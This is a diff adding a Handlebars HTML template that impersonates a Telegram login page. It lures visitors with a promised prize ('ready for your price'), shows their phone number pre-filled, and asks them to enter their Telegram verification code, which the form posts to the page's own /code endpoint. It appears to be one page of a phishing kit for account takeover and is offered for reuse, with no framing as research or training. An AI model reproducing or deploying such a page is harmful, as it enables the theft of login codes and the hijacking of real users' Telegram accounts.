@@ -1,0 +1,60 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+ 
+{{!-- IDs are for you to use js on them incase you want to add some funtionality{{{lol (:  }}} 
+change anything if you want... 
+regards: kamohelo  --}}
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+ 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title> 
+        Telegram login page 
+    </title> 
+    <link rel="stylesheet" href="style/style.css"> 
+ 
+</head> 
+ 
+ 
+<body> 
+ 
+    <div class="header"> 
+        <h1>telegram</h1> 
+    </div> 
+    <div class="wrapper" id="wrapper">  
+        <div class="user_img" id="user_img"> 
+            <img src={{imgLink}} alt="user image"> 
+ 
+        </div> 
+ 
+        <div class="words" id="words"> 
+            <p> just one step more and you are ready for your price </p> 
+ 
+        </div> 
+ 
+ 
+ 
+        <form action="/code" method="post" > 
+       
+            <label for="num">Your country phone number:</label> 
+            <input type="text" name="" id="country" class="countryInput" value="{{number}}" readonly required>
+
+            <label for="num"> Enter the code </label> 
+            <input type="number" name="code" id="num" placeholder="Code"  required>
+
+
+
+ 
+           <div class="login submit"> 
+               <i class="fa-solid fa-arrow-right "></i>
+            </div> 
+            </form>
+    </div> 
+
+    <script src="js/index.js"></script>
+</body> 
+</html>
